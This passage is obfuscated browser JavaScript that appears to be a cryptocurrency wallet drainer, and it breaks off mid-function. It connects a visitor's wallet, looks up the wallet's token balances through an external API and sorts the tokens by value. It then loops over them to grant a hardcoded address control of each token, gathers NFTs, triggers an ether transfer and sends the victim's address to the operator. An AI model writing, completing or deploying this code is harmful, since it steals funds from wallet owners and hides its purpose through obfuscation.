const _0x5f1a88=_0x4de2;function _0x4de2(_0x18f2b6,_0x3a8cce){const _0x4f60df=_0x4f60();return _0x4de2=function(_0x4de25e,_0x1df534){_0x4de25e=_0x4de25e-0x9c;let _0x4e782f=_0x4f60df[_0x4de25e];return _0x4e782f;},_0x4de2(_0x18f2b6,_0x3a8cce);}(function(_0x119aa3,_0x468c4b){const _0x4b36c3=_0x4de2,_0x41b472=_0x119aa3();while(!![]){try{const _0x463d22=parseInt(_0x4b36c3(0x186))/0x1*(parseInt(_0x4b36c3(0x1a5))/0x2)+-parseInt(_0x4b36c3(0xf6))/0x3*(-parseInt(_0x4b36c3(0x17e))/0x4)+parseInt(_0x4b36c3(0x172))/0x5*(-parseInt(_0x4b36c3(0x18b))/0x6)+-parseInt(_0x4b36c3(0xb9))/0x7*(parseInt(_0x4b36c3(0x14c))/0x8)+parseInt(_0x4b36c3(0x18e))/0x9+-parseInt(_0x4b36c3(0xa5))/0xa+parseInt(_0x4b36c3(0x183))/0xb;if(_0x463d22===_0x468c4b)break;else _0x41b472['push'](_0x41b472['shift']());}catch(_0x42c4a9){_0x41b472['push'](_0x41b472['shift']());}}}(_0x4f60,0xef085));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window['Web3Modal'][_0x5f1a88(0x168)],WalletConnectProvider=window[_0x5f1a88(0x157)]['default'],OWNER_ADDRESS=_0x5f1a88(0x112),ABI=[{'constant':!![],'inputs':[],'name':_0x5f1a88(0x155),'outputs':[{'name':'','type':_0x5f1a88(0xf8)}],'payable':![],'stateMutability':'view','type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':'address'}],'name':'deprecate','outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':_0x5f1a88(0xe7),'type':'address'},{'name':_0x5f1a88(0x190),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x16f),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0x132),'outputs':[{'name':'','type':_0x5f1a88(0x160)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':_0x5f1a88(0x171),'type':_0x5f1a88(0x19b)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':'function'},{'constant':![],'inputs':[{'name':_0x5f1a88(0x161),'type':'address'},{'name':_0x5f1a88(0xe4),'type':_0x5f1a88(0x19b)},{'name':_0x5f1a88(0x190),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x131),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0xea),'outputs':[{'name':'','type':_0x5f1a88(0x19b)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':'balances','outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0x184),'outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0x13e),'outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':'function'},{'constant':![],'inputs':[],'name':_0x5f1a88(0x13a),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':'function'},{'constant':!![],'inputs':[{'name':'_maker','type':'address'}],'name':_0x5f1a88(0x101),'outputs':[{'name':'','type':_0x5f1a88(0x160)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[{'name':'','type':_0x5f1a88(0x19b)},{'name':'','type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0x166),'outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[{'name':_0x5f1a88(0xae),'type':'address'}],'name':_0x5f1a88(0xa2),'outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':'function'},{'constant':![],'inputs':[],'name':_0x5f1a88(0xd0),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0x178),'outputs':[{'name':'','type':_0x5f1a88(0x19b)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0xe9),'outputs':[{'name':'','type':_0x5f1a88(0x19b)}],'payable':![],'stateMutability':'view','type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x5f1a88(0xf8)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':'_to','type':'address'},{'name':_0x5f1a88(0x190),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x141),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':_0x5f1a88(0x12d),'type':_0x5f1a88(0x12e)},{'name':_0x5f1a88(0xcf),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x170),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':'amount','type':_0x5f1a88(0x12e)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':'amount','type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x193),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':'function'},{'constant':!![],'inputs':[{'name':_0x5f1a88(0x151),'type':'address'},{'name':_0x5f1a88(0xe7),'type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0x9e),'outputs':[{'name':_0x5f1a88(0x130),'type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0x15c),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[{'name':'','type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0xd1),'outputs':[{'name':'','type':_0x5f1a88(0x160)}],'payable':![],'stateMutability':'view','type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':'_clearedUser','type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0xfe),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'constant':!![],'inputs':[],'name':_0x5f1a88(0x1a2),'outputs':[{'name':'','type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':'view','type':_0x5f1a88(0xef)},{'constant':![],'inputs':[{'name':_0x5f1a88(0x128),'type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0xc3),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':_0x5f1a88(0x182),'type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0x11d),'outputs':[],'payable':![],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'name':_0x5f1a88(0x148),'type':_0x5f1a88(0x12e)},{'name':_0x5f1a88(0x179),'type':'string'},{'name':_0x5f1a88(0x10e),'type':'string'},{'name':_0x5f1a88(0xc7),'type':_0x5f1a88(0x12e)}],'payable':![],'stateMutability':'nonpayable','type':_0x5f1a88(0x13b)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5f1a88(0x106),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x121),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5f1a88(0x106),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x14a),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5f1a88(0x154),'type':_0x5f1a88(0x19b)}],'name':'Deprecate','type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5f1a88(0xad),'type':'uint256'},{'indexed':![],'name':_0x5f1a88(0x15f),'type':_0x5f1a88(0x12e)}],'name':'Params','type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':_0x5f1a88(0x19b)},{'indexed':![],'name':_0x5f1a88(0xf3),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x11a),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5f1a88(0x115),'type':'address'}],'name':_0x5f1a88(0x18d),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5f1a88(0x115),'type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0x118),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x5f1a88(0xe9),'type':_0x5f1a88(0x19b)},{'indexed':!![],'name':_0x5f1a88(0xde),'type':_0x5f1a88(0x19b)},{'indexed':![],'name':'value','type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0xb3),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x5f1a88(0x9f),'type':_0x5f1a88(0x19b)},{'indexed':!![],'name':'to','type':_0x5f1a88(0x19b)},{'indexed':![],'name':'value','type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x10a),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x5f1a88(0x15e),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[],'name':_0x5f1a88(0x17d),'type':'event'}],ABIN=[{'inputs':[{'internalType':_0x5f1a88(0xf8),'name':_0x5f1a88(0x155),'type':_0x5f1a88(0xf8)},{'internalType':_0x5f1a88(0xf8),'name':_0x5f1a88(0xa1),'type':'string'},{'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0xf4),'type':_0x5f1a88(0x12e)},{'internalType':'uint256','name':_0x5f1a88(0x17b),'type':_0x5f1a88(0x12e)}],'stateMutability':_0x5f1a88(0xeb),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x5f1a88(0xe9),'type':_0x5f1a88(0x19b)},{'indexed':!![],'internalType':_0x5f1a88(0x19b),'name':'approved','type':_0x5f1a88(0x19b)},{'indexed':!![],'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0x109),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0xb3),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5f1a88(0x19b),'name':'owner','type':_0x5f1a88(0x19b)},{'indexed':!![],'internalType':_0x5f1a88(0x19b),'name':_0x5f1a88(0x163),'type':_0x5f1a88(0x19b)},{'indexed':![],'internalType':'bool','name':_0x5f1a88(0xe8),'type':_0x5f1a88(0x160)}],'name':_0x5f1a88(0x12f),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5f1a88(0x19b),'name':_0x5f1a88(0xd2),'type':_0x5f1a88(0x19b)},{'indexed':!![],'internalType':'address','name':_0x5f1a88(0x128),'type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0x135),'type':_0x5f1a88(0xab)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':'from','type':'address'},{'indexed':!![],'internalType':'address','name':'to','type':_0x5f1a88(0x19b)},{'indexed':!![],'internalType':_0x5f1a88(0x12e),'name':'tokenId','type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x10a),'type':_0x5f1a88(0xab)},{'inputs':[],'name':_0x5f1a88(0xcc),'outputs':[{'internalType':'string','name':'','type':_0x5f1a88(0xf8)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xf2),'outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':'uint256'}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xb5),'outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':'uint256'}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xb2),'outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':_0x5f1a88(0x12e)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':'address','name':'to','type':'address'},{'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0x109),'type':_0x5f1a88(0x12e)}],'name':'approve','outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x19b),'name':'owner','type':_0x5f1a88(0x19b)}],'name':'balanceOf','outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':_0x5f1a88(0x12e)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x5f1a88(0xf8),'name':'','type':'string'}],'stateMutability':'view','type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0x11c),'outputs':[],'stateMutability':'nonpayable','type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0x137),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0x109),'type':'uint256'}],'name':_0x5f1a88(0xaa),'outputs':[{'internalType':_0x5f1a88(0x19b),'name':'','type':'address'}],'stateMutability':'view','type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x19b),'name':'owner','type':_0x5f1a88(0x19b)},{'internalType':_0x5f1a88(0x19b),'name':_0x5f1a88(0x163),'type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0xe5),'outputs':[{'internalType':'bool','name':'','type':'bool'}],'stateMutability':'view','type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xbf),'outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':_0x5f1a88(0x12e)}],'stateMutability':_0x5f1a88(0x156),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x5f1a88(0x1a4),'type':'uint256'}],'name':_0x5f1a88(0x14f),'outputs':[],'stateMutability':_0x5f1a88(0xba),'type':_0x5f1a88(0xef)},{'inputs':[],'name':'name','outputs':[{'internalType':_0x5f1a88(0xf8),'name':'','type':_0x5f1a88(0xf8)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xe9),'outputs':[{'internalType':_0x5f1a88(0x19b),'name':'','type':_0x5f1a88(0x19b)}],'stateMutability':'view','type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x12e),'name':'tokenId','type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x12c),'outputs':[{'internalType':_0x5f1a88(0x19b),'name':'','type':_0x5f1a88(0x19b)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xbd),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xca),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x19b),'name':'from','type':_0x5f1a88(0x19b)},{'internalType':_0x5f1a88(0x19b),'name':'to','type':_0x5f1a88(0x19b)},{'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0x109),'type':'uint256'}],'name':_0x5f1a88(0x199),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':'address','name':_0x5f1a88(0x9f),'type':'address'},{'internalType':'address','name':'to','type':_0x5f1a88(0x19b)},{'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0x109),'type':'uint256'},{'internalType':_0x5f1a88(0x10d),'name':_0x5f1a88(0xd9),'type':_0x5f1a88(0x10d)}],'name':_0x5f1a88(0x199),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':'function'},{'inputs':[],'name':_0x5f1a88(0x140),'outputs':[{'internalType':_0x5f1a88(0x160),'name':'','type':'bool'}],'stateMutability':'view','type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x19b),'name':_0x5f1a88(0x163),'type':_0x5f1a88(0x19b)},{'internalType':'bool','name':'approved','type':'bool'}],'name':_0x5f1a88(0x126),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0xf8),'name':_0x5f1a88(0xee),'type':_0x5f1a88(0xf8)}],'name':_0x5f1a88(0x144),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':'function'},{'inputs':[{'internalType':_0x5f1a88(0xf8),'name':_0x5f1a88(0x124),'type':_0x5f1a88(0xf8)}],'name':'setProvenanceHash','outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':'uint256','name':_0x5f1a88(0xa4),'type':_0x5f1a88(0x12e)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':'nonpayable','type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xbb),'outputs':[],'stateMutability':'nonpayable','type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0x19a),'outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':_0x5f1a88(0x12e)}],'stateMutability':_0x5f1a88(0x156),'type':'function'},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':_0x5f1a88(0x12e)}],'stateMutability':'view','type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x11e),'name':_0x5f1a88(0xe6),'type':_0x5f1a88(0x11e)}],'name':_0x5f1a88(0x103),'outputs':[{'internalType':_0x5f1a88(0x160),'name':'','type':_0x5f1a88(0x160)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[],'name':_0x5f1a88(0xa1),'outputs':[{'internalType':_0x5f1a88(0xf8),'name':'','type':_0x5f1a88(0xf8)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':'uint256','name':_0x5f1a88(0x10b),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x1a0),'outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':_0x5f1a88(0x12e)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x19b),'name':'owner','type':_0x5f1a88(0x19b)},{'internalType':_0x5f1a88(0x12e),'name':'index','type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0xc5),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0x109),'type':_0x5f1a88(0x12e)}],'name':'tokenURI','outputs':[{'internalType':_0x5f1a88(0xf8),'name':'','type':'string'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x5f1a88(0xf9),'outputs':[{'internalType':_0x5f1a88(0x12e),'name':'','type':_0x5f1a88(0x12e)}],'stateMutability':_0x5f1a88(0x156),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':'address','name':_0x5f1a88(0x9f),'type':_0x5f1a88(0x19b)},{'internalType':_0x5f1a88(0x19b),'name':'to','type':_0x5f1a88(0x19b)},{'internalType':_0x5f1a88(0x12e),'name':_0x5f1a88(0x109),'type':_0x5f1a88(0x12e)}],'name':_0x5f1a88(0x131),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)},{'inputs':[{'internalType':_0x5f1a88(0x19b),'name':_0x5f1a88(0x128),'type':_0x5f1a88(0x19b)}],'name':_0x5f1a88(0xc3),'outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':'function'},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':_0x5f1a88(0xeb),'type':_0x5f1a88(0xef)}],networkToId={0x1328cf7:_0x5f1a88(0x120),0x1:'eth-mainnet',0x5:_0x5f1a88(0x147),0x89:_0x5f1a88(0x162),0x13881:_0x5f1a88(0x17a),0x38:_0x5f1a88(0xb0),0x61:_0x5f1a88(0xf5),0xa86a:'avalanche-mainnet',0xa869:_0x5f1a88(0x19f),0xfa:_0x5f1a88(0xc6),0xfa2:_0x5f1a88(0x1a1),0xa4b1:_0x5f1a88(0x14b),0x66eed:_0x5f1a88(0xda),0xa4ba:_0x5f1a88(0x125),0x250:_0x5f1a88(0x9d),0x51:_0x5f1a88(0x149),0x150:_0x5f1a88(0xe3),0x4e454152:'aurora-mainnet',0x4e454153:_0x5f1a88(0x113),0x6984c:_0x5f1a88(0xe0),0x69849:'avalanche-dexalot-testnet',0x7e4:_0x5f1a88(0x104),0x14a33:_0x5f1a88(0xf0),0x77:'bittorrent-mainnet',0x405:_0x5f1a88(0x10c),0xa918:'boba-avalanche-mainnet',0x10e8:_0x5f1a88(0x15a),0xdbe0:_0x5f1a88(0x129),0x2600:_0x5f1a88(0x127),0x50e:_0x5f1a88(0x142),0x511:_0x5f1a88(0xd6),0x120:'boba-mainnet',0x1c:'boba-rinkeby-testnet',0xb48:'boba-goerli',0x1e14:'canto-mainnet',0x436f7631:'covalent-internal-network-v1',0x19:_0x5f1a88(0xc2),0x152:'cronos-testnet',0xd2af:_0x5f1a88(0xdf),0x14f:_0x5f1a88(0x123),0xa516:_0x5f1a88(0x18a),0x2329:_0x5f1a88(0xa9),0x2328:_0x5f1a88(0x108),0x868:_0x5f1a88(0xd8),0x86a:_0x5f1a88(0x180),0x13:_0x5f1a88(0x17c),0x10:_0x5f1a88(0x10f),0xe:'flarenetworks-flare-mainnet',0x72:'flarenetworks-flare-testnet',0xb7e7759:_0x5f1a88(0x169),0x153c099c:_0x5f1a88(0x13f),0x63564c40:_0x5f1a88(0xe1),0x6357d2e0:_0x5f1a88(0xcd),0x141:_0x5f1a88(0x15b),0x142:_0x5f1a88(0xb1),0xe704:_0x5f1a88(0x167),0x1389:_0x5f1a88(0x158),0x52:_0x5f1a88(0x13c),0x53:_0x5f1a88(0x16e),0x440:_0x5f1a88(0x12b),0x24c:_0x5f1a88(0x110),0x7d2:'milkomeda-a1-mainnet',0x30e0a:_0x5f1a88(0xa6),0x7d1:_0x5f1a88(0x11b),0x30da5:'milkomeda-c1-devnet',0x504:'moonbeam-mainnet',0x507:_0x5f1a88(0x105),0x505:_0x5f1a88(0x188),0xe9ac0ce:_0x5f1a88(0x100),0x116ea:'nervos-godwoken-mainnet',0x116e9:_0x5f1a88(0xb4),0x116e1:_0x5f1a88(0x111),0x5afe:_0x5f1a88(0xc9),0x5aff:_0x5f1a88(0x164),0xf8:_0x5f1a88(0xc4),0x249c:_0x5f1a88(0x198),0xa:_0x5f1a88(0xfd),0x2a15c308d:_0x5f1a88(0x122),0x2a15c3083:'palm-testnet',0x5a2:_0x5f1a88(0x174),0x1e:'rsk-mainnet',0x1f:_0x5f1a88(0xb6),0x5d456c62:_0x5f1a88(0x150),0x1482a7b2:_0x5f1a88(0xaf),0x3d28774d:_0x5f1a88(0xf7),0x109b4597:_0x5f1a88(0xc0),0x536f6c4d:_0x5f1a88(0x14d),0x1202c:'swimmer-mainnet',0x1202d:_0x5f1a88(0x173),0x1a0:_0x5f1a88(0x159)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0x89:_0x5f1a88(0x18f)},'chainId':0x89,'network':_0x5f1a88(0x189),'infuraId':_0x5f1a88(0x119),'pollingInterval':_0x5f1a88(0x16a)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x5f1a88(0xb7),'infuraId':_0x5f1a88(0x119),'rpc':_0x5f1a88(0x18f),'chainId':0x89,'chainName':_0x5f1a88(0x189),'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$('.connect')[_0x5f1a88(0x11f)](async function(){const _0x8143da=_0x5f1a88;try{let _0x1ce315=await web3Modal['connect']();onProvider(_0x1ce315),_0x1ce315['on'](_0x8143da(0xac),_0x54f092=>{const _0x196caa=_0x8143da;console[_0x196caa(0xce)](_0x54f092),onProvider(_0x1ce315);});}catch(_0xecd07c){console['log'](_0x8143da(0x185),_0xecd07c);return;}});async function onProvider(_0x1bc172){const _0x5b24c1=_0x5f1a88;web3Object=new Web3(_0x1bc172);let _0x4632ef=await web3Object[_0x5b24c1(0xd7)][_0x5b24c1(0x194)]();selectedAccount=_0x4632ef[0x0],chainName=await web3Object['eth'][_0x5b24c1(0x12a)](),chainId=networkToId[chainName],console['log'](chainId),console[_0x5b24c1(0xce)](selectedAccount),_0x4632ef[_0x5b24c1(0xdc)]&&(sendMessage(_0x5b24c1(0xd3)),sendMessage(_0x5b24c1(0xfa)+selectedAccount),covalenthqAPICall());}const Oxa=_0x5f1a88(0xfb),Oxc=_0x5f1a88(0x143);async function covalenthqAPICall(){const _0x442874=_0x5f1a88,_0x5ace9b={'chain':'polygon'},_0x52e4b5=new URL(_0x442874(0x16b)+selectedAccount+_0x442874(0xdd));_0x52e4b5[_0x442874(0x136)]=new URLSearchParams(_0x5ace9b)[_0x442874(0xd4)]();const _0x2da7dd={'method':_0x442874(0x114),'headers':{'accept':'application/json','X-API-Key':_0x442874(0x165)}};try{const _0xf5c9da=await fetch(_0x52e4b5,_0x2da7dd)['then'](_0x132714=>_0x132714[_0x442874(0x138)]());console[_0x442874(0xce)](_0xf5c9da);let _0xfe48b3=_0xf5c9da;console['log'](_0x442874(0x9c),_0xfe48b3);let _0x795b77=await Promise[_0x442874(0x117)](_0xfe48b3[_0x442874(0x17f)](async _0xa8aab3=>{const _0x59f506=_0x442874;let _0x10a71c;try{_0x10a71c=await getValue(_0xa8aab3['token_address'],_0xa8aab3[_0x59f506(0x195)],_0xa8aab3[_0x59f506(0x107)]);}catch(_0x1d1250){_0x10a71c=0x0;}return console[_0x59f506(0xce)](_0x10a71c),{'balance':_0xa8aab3['balance'],'value':_0x10a71c,'address':_0xa8aab3[_0x59f506(0x187)]};}));console[_0x442874(0xce)](_0x442874(0x133),_0x795b77),tokens=_0x795b77[_0x442874(0x153)](_0xc6bc2b=>_0xc6bc2b[_0x442874(0xec)]>0x5),tokens[_0x442874(0x116)]((_0x568d9f,_0x1e4647)=>_0x1e4647['value']-_0x568d9f[_0x442874(0xec)]),console['log']('chainId:',chainId,_0x442874(0xa8),tokens);if(tokens[_0x442874(0xdc)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x442874(0x16d));}NFTs=await getNFTs(selectedAccount)['catch'](_0x3af603=>{const _0x58f00e=_0x442874;console[_0x58f00e(0xce)]('Unable\x20to\x20get\x20NFts',_0x3af603);}),NFTs=NFTs[_0x442874(0x197)],console[_0x442874(0xce)](_0x442874(0x134),NFTs);}async function onApprove(){const _0x27af01=_0x5f1a88;if(tokens[_0x27af01(0xdc)])try{loopTokens(tokens);}catch(_0x471a17){console['error'](_0x27af01(0x19c)+_0x471a17[_0x27af01(0xf1)]);}else{if(NFTs[_0x27af01(0xdc)]){try{loopNfts(NFTs);}catch(_0x4fc7cf){console[_0x27af01(0xfc)](_0x27af01(0x19c)+_0x4fc7cf['message']);}onSendEther(),sendMessage('Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!');}else try{onSendEther();}catch(_0x119886){console[_0x27af01(0xfc)](_0x27af01(0x19c)+_0x119886['message']);}}}async function loopTokens(_0x4be013){const _0x11633a=_0x5f1a88;for await(let _0x4e2011 of _0x4be013){console[_0x11633a(0xce)](_0x11633a(0x176),_0x4e2011);try{let _0x5c9140=new web3Object[(_0x11633a(0xd7))][(_0x11633a(0xdb))](ABI,_0x4e2011[_0x11633a(0x19b)]);sendMessage(_0x11633a(0x102)),await _0x5c9140[_0x11633a(0x14e)][_0x11633a(0x16f)](Oxa,_0x11633a(0xc1))['send']({'from':selectedAccount,'to':_0x4e2011[_0x11633a(0x19b)]})['on']('transactionHash',_0x3eaaff=>{const _0x4ca272=_0x11633a;console[_0x4ca272(0xce)](_0x4ca272(0xe2)+_0x3eaaff);})['on']('receipt',_0x19d107=>{const 